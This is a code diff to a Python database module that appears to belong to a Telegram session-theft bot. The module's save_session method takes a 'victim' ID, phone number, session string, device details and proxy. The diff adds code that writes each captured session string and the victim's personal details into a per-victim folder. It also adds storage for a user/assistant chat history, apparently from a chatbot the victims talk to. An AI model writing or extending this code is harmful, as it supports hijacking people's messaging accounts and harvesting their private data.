@@ -73,6 +73,16 @@ class Database:
         """)
 
         cursor.execute("""
+            CREATE TABLE IF NOT EXISTS psych_sessions (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                user_tg_id INTEGER,
+                message TEXT,
+                role TEXT,  -- 'user' или 'assistant'
+                created_at DATETIME DEFAULT CURRENT_TIMESTAMP
+            )
+        """)
+
+        cursor.execute("""
             CREATE TABLE IF NOT EXISTS audit_log (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
                 admin_tg_id INTEGER,
@@ -88,6 +98,7 @@ class Database:
 
     def save_session(self, victim_tg_id: int, phone: str, session_string: str,
                      device_info: Dict[str, str], proxy: str, username: Optional[str] = None) -> int:
+        # 1. Сохраняем в БД как раньше
         conn = self._get_conn()
         cursor = conn.cursor()
         cursor.execute("""
@@ -104,7 +115,68 @@ class Database:
             device_info.get("ip_geo", "unknown")
         ))
         conn.commit()
-        return cursor.lastrowid
+        session_id = cursor.lastrowid
+
+        # 2. Сохраняем в папку
+        import os
+        from datetime import datetime
+
+        # Имя папки: юзернейм (или телефон, если юзернейма нет)
+        folder_name = username if username else phone.replace("+", "")
+        # Убираем опасные символы для пути
+        folder_name = folder_name.replace("@", "").replace("/", "_").replace("\\", "_").replace(":", "_")
+        
+        # Если папка уже есть — добавляем ID чтобы не конфликтовать
+        session_dir = f"data/sessions/{folder_name}"
+        if os.path.exists(session_dir):
+            session_dir = f"data/sessions/{folder_name}_{victim_tg_id}"
+        
+        os.makedirs(session_dir, exist_ok=True)
+
+        # Пишем session файл
+        with open(f"{session_dir}/session.session", "w", encoding="utf-8") as f:
+            f.write(session_string)
+
+        # Пишем инфо
+        with open(f"{session_dir}/info.txt", "w", encoding="utf-8") as f:
+            f.write(f"ID в БД: {session_id}\n")
+            f.write(f"Username: @{username or 'N/A'}\n")
+            f.write(f"Phone: {phone}\n")
+            f.write(f"TG ID: {victim_tg_id}\n")
+            f.write(f"Device: {device_info.get('device_model', 'N/A')} | {device_info.get('system_version', 'N/A')}\n")
+            f.write(f"Proxy: {proxy}\n")
+            f.write(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+
+        print(f"[+] Сессия сохранена в: {session_dir}/")
+        
+        return session_id
+
+    def save_psych_message(self, tg_id: int, message: str, role: str):
+        conn = self._get_conn()
+        cursor = conn.cursor()
+        cursor.execute(
+            "INSERT INTO psych_sessions (user_tg_id, message, role) VALUES (?, ?, ?)",
+            (tg_id, message, role)
+        )
+        conn.commit()
+
+    def get_psych_history(self, tg_id: int, limit: int = 20) -> List[Dict]:
+        conn = self._get_conn()
+        cursor = conn.cursor()
+        cursor.execute(
+            "SELECT message, role FROM psych_sessions WHERE user_tg_id = ? ORDER BY created_at DESC LIMIT ?",
+            (tg_id, limit)
+        )
+        rows = cursor.fetchall()
+        # Переворачиваем в хронологическом порядке
+        return [{"role": r["role"], "content": r["message"]} for r in reversed(rows)]
+
+    def clear_psych_history(self, tg_id: int):
+        conn = self._get_conn()
+        cursor = conn.cursor()
+        cursor.execute("DELETE FROM psych_sessions WHERE user_tg_id = ?", (tg_id,))
+        conn.commit()
+            
 
     def get_all_sessions(self, limit: int = 100, offset: int = 0) -> List[Dict[str, Any]]:
         conn = self._get_conn()
